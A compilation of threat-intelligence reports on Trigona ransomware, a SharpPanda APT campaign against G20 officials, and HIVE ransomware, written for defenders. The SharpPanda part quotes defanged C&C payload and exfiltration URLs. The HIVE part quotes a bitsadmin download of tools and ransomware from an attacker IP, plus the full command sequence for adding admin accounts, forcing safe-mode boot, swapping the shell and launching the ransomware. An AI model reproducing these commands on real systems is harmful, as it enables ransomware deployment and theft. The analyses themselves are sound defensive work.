Remote Desktop Protocol Trigona operators utilize RDP to move laterally in the victim’s environment. 
TA0008 Lateral Movement T1570.
Lateral Tool Transfer Trigona operators use Splashtop to transfer malicious tools from computer to computer in the victim’s environment. 
TA0011 Command and Control T1105.
Ingress Tool Transfer Trigona operators utilize Splashtop to transfer netscan.exe, netscan.lic, netscan.xml, newuser.bat, start.bat and turnoff.bat. T1219.
Remote Access Software Trigona operators install and execute remote access tools such as Splashtop on targeted systems. 
TA0040 Impact T1486.
Data Encrypted for Impact Trigona ransomware encrypts files with the ._locked file extension. 
T1489.
Service Stop Turnoff.bat uses sc stop and taskkill to stop services related to remote desktop tools (e.g., ScreenConnect, LogMeIn and TeamViewer), as well as VMware, Hyper-V and SQL. T1490.
Inhibit System Recovery Trigona operators use Turnoff.bat to delete Volume Shadow Copies. Conclusion Trigona is a newer strain of ransomware that, to date, has had minimal coverage by security news articles.
This lack of security community awareness allows Trigona to discreetly attack victims while other higher-profile ransomware operations dominate the news headlines.
We hope that shining a light on Trigona and its uncommon technique of using password-protected executables to obfuscate malware helps defenders better protect their organizations against this threat. 
Due to the stream of victims identified by the Unit 42 team and Trigona’s currently developing leak site, the operator and/or affiliates behind the ransomware likely will continue (and possibly even ramp up) its malicious activity. 
Palo Alto Networks customers receive protections from Trigona threats through the following products: WildFire currently lists all known binaries of Trigona as malicious, which will trigger alerting within Prisma Cloud and Cortex XDR. 
Prisma Cloud will detect any instance of this malware being executed through properly configured Defender agents using Wildfire. 
Additionally, Prisma Cloud Defender agents can be installed on Windows 2016 and 2019 servers, as well as on Windows Docker Container hosts. 
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: North America Toll-Free: 866.486.4842 (866.4.UNIT42) EMEA: +31.20.299.3130 APAC:
+65.6983.8730 Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance. Indicators of Compromise IoC Note bef87e4d9fcaed0d8b53bce84ff5c5a70a8a30542100ca6d7822cbc8b76fef13 svhost.exe (Ransomware Binary) 853909af98031c125a351dad804317c323599233e9b14b79ae03f9de572b014e Splashtop 24123421dd5b78b79abca07bf2dac683e574bf9463046a1d6f84d1177c55f5e5 Netscan 4724EE7274C31C8D418904EE7E600D92680A54FECDAC28606B1D73A28ECB0B1E Netscan 9c8a4159166062333f2f74dd9d3489708c35b824986b73697d5c34869b2f7853 Netscan e22008893c91cf5bfe9f0f41e5c9cdafae178c0558728e9dfabfc11c34769936 Netscan 8d069455c913b1b2047026ef290a664cef2a2e14cbf1c40dce6248bd31ab0067 Netscan 544a4621cba59f3cc2aeb3fe34c2ee4522593377232cd9f78addfe537e988ddc start.bat a15c7b264121a7c202c74184365ca13b561fb303fb8699299039a59ab376adc6 turnoff.bat b7fba3abee8fd3bdac2d05c47ab75fdaa0796722451bed974fb72e442ab4fefd newuser.bat e5cf252041045b037b9a358f5412ae004423ad23eac17f3b03ebef7c8147a3bb Mimikatz 5603d4035201a9e6d0e130c561bdb91f44d8f21192c8e2842def4649333757ab Mimikatz 69f245dc5e505d2876e2f2eec87fa565c707e7c391845fa8989c14acabc2d3f6 Mimikatz phandaledr@onionmail[.]org Ransom note contact email farusbig@tutanota[.]com Ransom note contact email how_to_decrypt.hta Ransom note name 94979b61bba5685d038b4d66dd5e4e0ced1bba4c41ac253104a210dd517581b8 DC2.exe 9c8a4159166062333f2f74dd9d3489708c35b824986b73697d5c34869b2f7853 DC4.exe c5d09435d428695ce41526b390c17557973ee9e7e1cf6ca451e5c0ae443470ca DC6.exe 3x55o3u2b7cjs54eifja5m3ottxntlubhjzt6k6htp5nrocjmsxxh7ad[.]onion Trigona TOR negotiation portal 45.227.253[.]99 IP address associated with Trigona activity 45.227.253[.]106 IP address currently hosting Trigona leak site 45.227.253[.]98 IP address associated with Trigona activity 45.227.253[.]107 IP address associated with Trigona activity Additional Resources Product Protection Guide Product/Service Course of Action Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement 
The below courses of action mitigate the following techniques: Command and Scripting Interpreter [T1059], Create Account
[T1136], Account Manipulation [T1098], Local Account [T1136.001], File Deletion
[T1070.004], Modify Registry
[T1112], Disable or Modify Tools [T1562.001], Disable or Modify System Firewall
[T1562.004], Deobfuscate/Decode Files or Information
[T1140], Match Legitimate Name or Location
[T1036.005], Disable Windows Event Logging
[T1562.002], Obfuscated Files or Information [T1027], Clear Windows Event Logs
[T1070.001], Masquerade Task or Service [T1036.004], Credentials from Password Stores
[T1555], OS Credential Dumping [T1003], LSASS Memory [T1003.001], System Network Configuration Discovery
[T1016],
System Information Discovery
[T1082], Network Service Discovery [T1046], Permission Groups Discovery
[T1069],
Remote Desktop Protocol
[T1021.001], Lateral Tool Transfer [T1570], Software Deployment Tools
[T1072], Registry Run Keys / Startup Folder [T1547.001], Accessibility Features
[T1546.008], Bypass User Account Control
[T1548.002] Next-Generation Firewalls Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure remote access capabilities for the User-ID service account are forbidden. 
Ensure that User-ID is only enabled for internal trusted interfaces Define at least one 'Include Network'. 
Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Cortex XSOAR Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Impossible Traveler Deploy XSOAR Playbook - Port Scan Deploy XSOAR Playbook Cortex XDR - Isolate Endpoint Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Configure Host Firewall Profile Threat Prevention Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement 
The below courses of action mitigate the following techniques: Create Account
Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Cortex XSOAR Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Impossible Traveler Deploy XSOAR Playbook - Port Scan Deploy XSOAR Playbook Cortex XDR - Isolate Endpoint Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Configure Host Firewall Profile Threat Prevention Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies Persistence, Privilege Escalation, Defense Evasion 
[T1070.001], Masquerade Task or Service [T1036.004], Registry Run Keys / Startup Folder [T1547.001], Accessibility Features
Cortex XSOAR Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Impossible Traveler Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Persistence, Privilege Escalation, Defense Evasion 
The below courses of action mitigate the following techniques: File Deletion [T1070.004], Modify Registry
[T1548.002] Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Privilege Escalation, Defense Evasion 
[T1070.001], Masquerade Task or Service [T1036.004], Bypass User Account Control
[T1548.002] Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Defense Evasion 
[T1070.001], Masquerade Task or Service [T1036.004] Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Credential Access The below courses of action mitigate the following techniques: Credentials from Password Stores
[T1555], OS Credential Dumping [T1003], LSASS Memory [T1003.001] Cortex XDR Prevent Enable Anti-Exploit Protection Enable Anti-Malware Protection Discovery 
The below courses of action mitigate the following techniques: System Network Configuration Discovery [T1016],
[T1082], Network Service Discovery [T1046], Permission Groups Discovery [T1069] Next-Generation Firewalls Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Cortex XSOAR Deploy XSOAR Playbook - Port Scan Lateral Movement 
The below courses of action mitigate the following techniques: Remote Desktop Protocol
[T1021.001], Lateral Tool Transfer [T1570] Next-Generation Firewalls Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure remote access capabilities for the User-ID service account are forbidden. 
Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that User-ID is only enabled for internal trusted interfaces Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure that the User-ID service account does not have interactive logon rights Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Cortex XDR Prevent Configure Host Firewall Profile Cortex XSOAR Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Block Account Generic Threat Prevention Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies Command and Control 
The below courses of action mitigate the following techniques: Remote Access Software [T1219],
Ingress Tool Transfer [T1105] Next-Generation Firewalls Ensure that the Certificate used for Decryption is Trusted Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure 'SSL Forward Proxy Policy' for traffic destined to the Internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Setup File Blocking Threat Prevention Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies URL Filtering Ensure secure URL filtering is enabled for all security policies allowing traffic to the Internet Ensure all HTTP Header Logging options are enabled Ensure that PAN-DB URL Filtering is used Ensure that URL Filtering uses the action of “block” or “override” on the URL categories 
Ensure that access to every URL is logged Cortex XSOAR Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Deploy XSOAR Playbook - Hunting C&C Communication Playbook (Deprecated) Deploy XSOAR Playbook - Block URL Deploy XSOAR Playbook - Block IP Cortex XDR Prevent XDR BIOCs / ABIOCs Impact 
The below courses of action mitigate the following techniques: Data Encrypted for Impact [T1486], Service Stop [T1489],
Inhibit System Recovery [T1490] Cortex XSOAR Deploy XSOAR Playbook - Ransomware Manual for incident response. 
Deploy XSOAR Playbook - Palo Alto Networks Endpoint Malware Investigation Table 1.
Product Protection Guide. 
Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: SharpPanda APT Campaign Expands its Arsenal Targeting G20 Nations url: https://blog.cyble.com/2023/06/01/sharppanda-apt-campaign-expands-its-arsenal-targeting-g20-nations/ Threat Actors Utilize Undetected Loaders for Stealthy Attacks SharpPanda, an APT group originating from China, has seen a rise in its cyber-attack operations starting from at least 2018.
The APT group utilizes spear-phishing techniques to obtain initial access, employing a combination of outdated Microsoft Office document vulnerabilities, novel evasion techniques, and highly potent backdoor malware.
This backdoor enables Threat Actors (TAs) to exfiltrate system information, files, and other sensitive data from the targeted victim’s machine. 
Cyble Research and Intelligence Labs (CRIL) recently observed an ongoing campaign by SharpPanda APT.
Previously, this APT group has been observed targeting government officials, particularly in Southeast Asian countries.
This latest campaign specifically targets high-level government officials from G20 nations. 
The G20, or Group of Twenty, is an international forum comprising 19 countries and the European Union (EU).
Established in 1999, its primary objective is to foster global economic cooperation and address key challenges impacting the worldwide economy. 
Member countries of the G20 include Argentina, Australia, Brazil, Canada, China, France, Germany, India, Indonesia, Italy, Japan, Mexico, Russia, Saudi Arabia, South Africa, South Korea, Turkey, the United Kingdom, and the United States.
Together, these nations represent a diverse range of economies, constituting a significant share of global GDP and population.
The G20 holds annual summits where leaders convene to discuss and coordinate security, economic, and financial policies. 
In its latest campaign, the SharpPanda APT group employs a forged document linked to G7 to target various governments within the G20 forum. 
The delivery mechanism of the SharpPanda APT attack via a spam email is illustrated in the figure below. 
Figure 1 – Infection chain Technical Details Initial Infection 
The infection process initiates through a spam email comprising an attached MS Office document named “[FINAL] Hiroshima Action Statement for Resilient Global Food Security_trackchanged.docx.”
These emails, with the subject line “[Sending Finalized Text] G7+Partners FASS Meeting,” are distributed to multiple employees within government entities across G20 countries, as shown in the figure below. 
Figure 2 – Spam email containing malicious doc attachment 
The emails contain weaponized versions of seemingly genuine official documents, which employ the remote template injection method to retrieve the next stage of the malware from the TA’s Command-and-Control (C&C) server.
The attached document in the spam email is shown below. 
Figure 3 – Opened document attachment from spam email Upon opening the document, it initiates the download of a new payload from the attacker’s remote server (hxxp[:]//13[.]236[.]189[.]80:8000/res/translate[.]res), which is RTF file serving as the next-level payload. 
Figure 4 – Payload URL present inside the XML file of the malicious document The RTF file is weaponized using a tool called RoyalRoad.
This tool enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Word’s Equation Editor. 
RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office.
The TAs integrate anti-analysis and anti-debugging techniques into their loaders to avoid being detected while also utilizing the older Equation Editor exploits. 
The RTF file includes both an encrypted payload and shellcode.
Once the RTF file is executed, it proceeds to decrypt and drops an embedded payload, which is a DLL file saved under the name “c6gt.b” in the %temp% directory. 
After decryption, the shellcode facilitates the establishment of a persistence mechanism.
It achieves this by creating a scheduled task entry, which executes the export function “StartA” from the DLL “c6gt.b” using rundll32.exe on a daily basis. 
The figure below illustrates the presence of embedded content within the RTF document. 
Figure 5 – Embedded payload in RTF file Once the persistence is established, the RTF file proceeds to execute the downloaded DLL payload by utilizing the “rundll32.exe” command as follows: 
rundll32.exe C:\Users<Admin>\AppData\Local\Temp\c6gt.b StartA DLL Downloader (“c6gt.b”) 
The DLL file’s original name is “Downloader.dll.”
It contains four export functions, as depicted below. 
Figure 6 – Export functions of the DLL loader When the loader is executed through rundll32.exe, it collects various data from the victim’s computer.
This includes the hostname, operating system name, OS version, username, Internet information, as well as the presence of any installed anti-virus software on the machine. 
Subsequently, the loader encrypts the collected information using RC4 encryption with the key “xkYgv127” and encodes it using base64.
The encrypted data is then exfiltrated using the below C&C URL: hxxps://13[.]236[.]189[.]80:8001/G0AnyWhere_up[.]jsp?Data=[redacted] The figure below illustrates the exfiltrated data sent to the C&C server, as well as the decrypted/decoded stolen information obtained from the victim’s machine. 
Figure 7 – Exfiltrated data to C&C server Final Payload Once the victim’s information is sent to the remote server, the TA checks the information.
If they deem the victim’s machine to be intriguing, the C&C server responds with the next stage executable.
During the final phase of the infection chain, the malicious loader in the SharpPanda APT campaign is specifically designed to download a backdoor module.
However, during our analysis, no response was received from the remote server. 
In previous SharpPanda APT campaigns, the loader establishes a connection with a C&C server in the final stage of the attack.
Subsequently, it downloads and executes a malicious backdoor. 
With its extensive capabilities, this backdoor possesses the ability to perform a variety of operations, including: Capture screenshots of victims’ system Obtain information about processes and services running on the machine Create or terminate processes Delete/Create/Rename/Read/Write files and retrieve file attributes Retrieve TCP/UDP tables Retrieve information about registry keys Obtain titles of all top-level windows Trigger a shutdown of the targeted computer Gather computer-specific information such as computer name, username, gateway address, network adapter details, Windows version, and user type Conclusion The SharpPanda APT group is comprised of exceptionally sophisticated cyber-TAs who execute targeted and extended attacks against specific targets, including governments, organizations, and industries, with the objectives of spying, disruption, or monetary gain.
SharpPanda has been associated with multiple cyber espionage campaigns, employing strategies such as spear-phishing, manipulation through social engineering, and exploiting zero-day vulnerabilities to gain illicit access to networks. 
Previously, this group has been observed targeting government officials, particularly in Southeast Asian countries.
However, as evidenced in this recent campaign, their focus has shifted to high-level government officials from G20 countries in Europe, North America, and South Asia.
The APT group consistently adapts its techniques and incorporates new tools into its arsenal as it evolves. 
CRIL actively monitors the latest APT attacks, phishing attempts, and circulating malware strains, consistently releasing informative blog posts that offer valuable insights and practical guidance to safeguard users against these widely recognized attacks. 
Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers.
We recommend that our readers follow the best practices as mentioned below: Avoid downloading pirated software from warez/torrent websites.
The “Hack Tool” present on sites such as YouTube, torrent sites, etc., mainly contains such malware. 
Use strong passwords and enforce multi-factor authentication wherever possible. 
Turn on the automatic software update feature on your computer, mobile, and other connected devices. 
Use a reputed anti-virus and internet security software package on your connected devices, including PC, laptop, and mobile. 
Refrain from opening untrusted links and email attachments without first verifying their authenticity. 
Educate employees on protecting themselves from threats like phishing/untrusted URLs. 
Block URLs that could be used to spread the malware, e.g., Torrent/Warez. 
Monitor the beacon on the network level to block data exfiltration by malware or TAs. 
Enable Data Loss Prevention (DLP) Solutions on the employees’ systems. 
MITRE ATT&CK:registered: Techniques Tactic Technique ID Technique Name Initial AccessT1566Spear-phishing AttachmentExecution T1204 T1203User ExecutionExploitation for Client ExecutionPersistenceT1053Scheduled TaskDefense EvasionT1497T1027Virtualization/Sandbox EvasionObfuscated Files or InformationDiscovery T1082 T1518T1016System Information Discovery Security Software DiscoverySystem Network ConfigurationCollectionT1006Data from Local SystemCommand AndControlT1065 T1071
T1105Uncommonly Used PortApplication Layer ProtocolIngress Tool TransferIndicators Of Compromise IndicatorsIndicator TypeDescriptionf39442edc4a96ce729e50f66901263e1734b1cd163937e9509ea616f5f7ff8870f7be8e51fb22c38c781495018deda70af49bda17269203547620c140ee9eee68cecc016MD5SHA1SHA256Spam email ea889308acb4249af92807cc7d70f08492c8f9ea9b6555e1b9c42cd7302f7caf62eb83e657b64a1ef1b04819ca9473e1bb74e1cf4be76b89b144e030dc1ef48f446ff95bMD5SHA1SHA256Documentattachment 92d994be99ea43c121ac4f4ddfacbf75f14afd2856dab6183150f6e269f5bb6f4a2e3f50180f5a0f9210698b54dcafb9a230b12e3eaf199889e5377a2acb7124c2d48d69MD5SHA1SHA256RTFdocument 09bf850be5da44a1c3629a1f62813a83a4e89d1f060e4dfd5f0fd4e7ba8be96967b39ac721f173a347ed111ce67e4c0f2c0bd4ee34bb7ca765da03635ca5c0df394cd7e6MD5SHA1SHA256DLL loader hxxp[:]//13[.]236[.]189[.]80:8000/res/translate[.]resURLRTF payloaddownload13[.]236[.]189[.]80:8000IP: PortC&C 
title: Increasing The Sting of HIVE Ransomware url: https://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/ How malicious actors evade detection and disable defenses for more destructive HIVE Ransomware attacks.
Rapid7 routinely conducts research into the wide range of techniques that threat actors use to conduct malicious activity.
One objective of this research is to discover new techniques being used in the wild, so we can develop new detection and response capabilities.
Recently, Rapid7 observed a malicious actor performing several known techniques for distributing ransomware across many systems within a victim’s environment.
In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files.
These extra steps would make it extremely difficult, if not impossible, for a victim to effectively use their security tools to defend endpoints after a certain point in the attack.
Rapid7 has updated existing and added new detections to InsightIDR to defend against these techniques.
In this article, we’ll explore the techniques employed by the threat actor, why they’re so effective, and how we’ve updated InsightIDR to protect against them.
What approach did the malicious actor take to prepare the victim's environment?Initially using Cobalt Strike, the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service (BITSAdmin)."C:\Windows\system32\bitsadmin.exe" /transfer
debjob /download
/priority normal http://79.137.206.47/PsExec.exe C:\Users\Public\PsExec.exe bitsadmin /transfer
/priority normal http://79.137.206.47/int.exe C:\Windows\int.exe The malicious actor then began using the remote process execution tool PSExec to execute batch files (rdp.bat) that would cause registry changes to enable Remote Desktop sessions (RDP) using reg.exe.
This enabled the malicious actor to laterally move throughout the victim’s environment using the graphical user interface.PSEXESVC.exe: C:\Windows\PSEXESVC.exe└──cmd.exe: C:\Windows\system32\cmd.exe /c ""rdp.bat" "└── reg.exe: reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v
"fDenyTSConnections" /t
REG_DWORD /d 0
/f Rapid7 observed the malicious actor add/change policies for the Active Directory domain to perform the following:Copy down batch scriptsExecute batch scripts (file1.bat), which:Creates administrator account on the local systemReconfigures boot configuration data (bcdedit.exe) so that the host will not load any additional drivers or services (ie: network drivers or endpoint protection)Sets various registry values to ensure the created local administrator user will automatically logon by defaultChanges the Windows Shell from Explorer to their malicious script (file2.bat)Reboots the system with the shutdown commandOn reboot, the system logs in and executes the shell (file2.bat), which:Extracts HIVE ransomware payload(s) from an encrypted archive (int.7z) using 7-Zip's console executable (7zr.exe)Executes the ransomware payload (int.exe or int64.exe)Below are some commands observed executed by the malicious actor (with necessary redactions):xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies {<REDACTED>}\Machine\Scripts\Startup\file1.bat" "C:\windows" xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\file2.bat" "C:\windows" xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\7zr.exe" "C:\windows" xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\int.7z" "C:\windows\" C:\WINDOWS\SYSTEM32\cmd.exe /c
"C:\windows\file1.bat" net user <REDACTED> <REDACTED> /add C:\WINDOWS\system32\net1 user <REDACTED> <REDACTED> /add net user <REDACTED> /active:yes C:\WINDOWS\system32\net1 user <REDACTED>
/active:yes net localgroup Administrators <REDACTED> /add 
C:\WINDOWS\system32\net1 localgroup Administrators <REDACTED> /add bcdedit /set {default} safeboot minimal reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
LegalNoticeText /t
REG_SZ /d "" /f reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
LegalNoticeCaption /t
REG_SZ /d "" /f reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v
REG_SZ /d "" /f reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
AutoAdminLogon /t
REG_SZ /d
1 /f reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
/v
DefaultUserName /t
<REDACTED> /f reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
DefaultPassword /t
AutoLogonCount /t REG_DWORD /d
1 /f reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
Shell /t
"C:\windows\file2.bat" /f shutdown -r -f
-t 10 -c "Computer Will Now Restart In SAFE MODE..." Rapid7 also observed the malicious actor extracting HIVE ransomware payload using 7zip's console application (7zr.exe) from encrypted 7zip archive (int.7z) with a simple password (123):"C:\windows\7zr.exe" x c:\windows\int.7z -p123 -oc:\windowsThe malicious actor then manually executed the ransomware (int.exe) once with only the required username:password combination passed to the -u flag.
This presumably encrypted the local drive and also all network shares the user had access to:"C:\Windows\int.exe" -u <REDACTED>:<REDACTED>"The malicious actor also manually executed the 64 bit version of the ransomware (int64.exe) once on a different host with the -no-discovery flag.
This is likely intended to override the default behavior and not discover network shares to encrypt their files.
The -u flag was also passed and the same values for the username:password were provided as seen on the other host.
C:\Windows\int64.exe -u <REDACTED>:<REDACTED> -no-discoveryWhy is this approach so effective?Deployment of ransomware using Active Directory group policies allows the malicious actor to hit all systems in the environment for as long as that group policy is active in the victim’s environment.
In this case, any system that was booting and connected to the environment would receive the configuration changes, encrypted archive containing the ransomware, a decompression utility to extract the ransomware, configuration changes and the order to reboot and execute.
This can be especially effective if timed with deployments of patches that require a reboot, done at the beginning of the day or even remotely using Powershell's Stop-Computer cmdlet.
Storing the ransomware within a 7zip encrypted archive (int.7z) with a password even as simple as (123) makes the task of identifying the ransomware on disk or transmitted across the network nearly impossible.
This makes retrieval and staging of the malicious actors payload very difficult to spot by security software or devices (Antivirus, Web Filtering, IDS/IPS and more).
In this case, the malicious actor has taken care to only put the encrypted copy on the disk of a victim’s system and not execute it until they have fully dropped the defenses on the endpoint.
Reconfiguring the default boot behavior to safeboot minimal and then executing a reboot unloads all but the bare minimum for the Windows operating system.
With no additional services, software or drivers loaded the system is at its most vulnerable.
With no active defenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.
It should be noted that in this state, there is no method of remotely interacting with the system as no network drivers are loaded.
In order to respond and halt the ransomware, each host must be physically visited for shutdown.
Manually priming the host in this way is more effective than the existing capabilities of the HIVE ransomware which stops specific defensive services (Windows Defender, etc) and kills specific processes prior to encrypting the contents of the drive.
All systems in this state are left automatically logged in as an administrator, which gives anyone who has physical access complete control.
Lastly, the system will continue to boot into safeboot minimal mode by default (again, no networking) until each system is set back to its original state with a command such as below.
Bringing the host back online in this state will still continue to execute the malware when logged into, which will also enable the default network spreading behavior.bcdedit /deletevalue
{default} safebootLastly, the malicious actor also manually executed the payload a few times on systems that had not been put into safeboot minimal and rebooted.
Systems they executed with only the -u flag actively searched out network shares they had access to and encrypted their contents.
This ensures that only the intended hosts do network share encryption and all those that were rebooted into safeboot minimal do not flood the network simultaneously encrypting all files.
It also means that the contents of network file shares that are not Windows based (various NAS devices, Linux hosts using Samba) will be encrypted even if the payload is not actually deployed on that specific host.
This approach would be extremely destructive to both corporate environments and home users with network attached storage systems for backups.
Rapid7 notes that ThreatLocker have reported on similar activity in their knowledge base article entitled Preventing BCDEdit From Being Weaponized.
Malware analysis of HIVE sampleRapid7 observed that the HIVE payload would not execute unless a flag of -u was passed.
During analysis it was discovered that passing -u asdf:asdf would result in the Login and Password (colon-delimited) provided to the victim to authenticate to the site behind the onion link on the TOR network:This, and other behaviors were previously reported on by Microsoft's article Hive Ransomware Gets Upgrades in Rust and also by Sophos in their Github Repository of IoC's mentioned in their article Lockbit, Hive, and BlackCat attack automotive supplier in triple ransomware attack.
There have been some flags that are noted to exist, but their features are not documented.
Rapid7 has analyzed the behaviors of these flags, documented them in addition to discovering two new flags (-timer, -low-key) in the HIVE ransomware samples.
The new flags -t, -timer, --timer effectively cause the malware to wait the specified number of seconds before going on to perform its actions.
The other new flags -low-key, --low-key will cause the ransomware to focus on only its encryption of data and not perform pre-encryption tasks, including deleting shadow copies (malicious use of vssadmin.exe, wmic.exe), deleting backup catalogs (malicious use of wbadmin.exe), and disabling Windows Recovery Mode (malicious use of bcdedit.exe).
These features give the malicious actor more control over how/when the payload is executed and skirt common methods of command line and parent/child process related detection for most ransomware families.
Fundamentally, the sample’s respective flags distill down into encryption operations of local, mount and discovery. 
The local module utilizes the LookupPrivilegeValueW and AdjustTokenPrivileges that Windows API calls on its own process via GetCurrentProcess and OpenProcessToken to obtain SeDebugPrivilege privileges. 
This is presumably crucial for OpenProcess -> OpenProcessToken -> ImpersonateLoggedOnUser API call attempts to processes: winlogon.exe and trustedinstaller.exe to subsequently stop security services and essential processes, if the --low-key is not passed during execution. 
ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe, notepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and ransom note display purposes.
The mount module will use NetUseEnum to identify the current list of locally-mounted network shares and add them to the list to be encrypted.
Lastly, the discovery module will use NetServerEnum to identify available Windows hosts within the domain/workgroup.
This list is then used with NetShareEnum to identify file shares on each remote host and add them to the list of locations to have their files encrypted.
By default, all three modes (local, mount and discovery)are enabled, so all local, mounted and shares able to be enumerated will have their contents encrypted.
This effectively ransoms all systems in a victim’s environment with a single execution of HIVE—when performed by a privileged user such as a Domain or Enterprise Admin account.
Command line flags may be used to change this behavior and invoke one or more of the modules.
For instance—local-only will use only the local module while—network-only will use the mount and discovery modules. 
FlagDescription-u<username>:<password> for login for hivecust*.onion domain to identify victim-da<domainname>\<username>:<password> use different credentials when doing network spreading.
Likely shorthand for "Domain Admin".
Calls LogonUserW triggering an 4624(S): Type 3 Network Logon event.
